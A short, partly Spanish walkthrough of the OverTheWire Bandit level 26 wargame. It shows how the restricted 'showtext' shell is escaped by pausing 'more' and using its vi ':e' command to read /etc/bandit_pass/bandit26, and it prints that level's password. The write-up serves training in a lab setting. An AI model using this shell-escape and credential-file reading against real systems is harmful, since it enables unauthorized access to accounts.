# Bandit Walkthrough

## Bandit 26

Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.

Lista de comandos:

```bash
##Entramos al directorio
cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext

##Vemos el contenido del archivo

#!/bin/sh

export TERM=linux

more ~/text.txt
exit 0

##Vemos que tenemos que hacer que al iniciar sesion la shell debe estar más pequeña que el mensaje que se muestra

ssh bandit26@bandit.labs.overthewire.org -p 2220 -i bandit26.sshkey

##Una vez nos sale el mensaje de more

##Podemos ejecutar comando para que nos muestre la clave
:e /etc/bandit_pass/bandit26


##El mensjae que nos muestra
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
~                                                                                                                                            
~                                                                                                                                            
~                                                                                                                                            
"/etc/bandit_pass/bandit26" [readonly] 1L, 33B 

```
Contraseña: s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
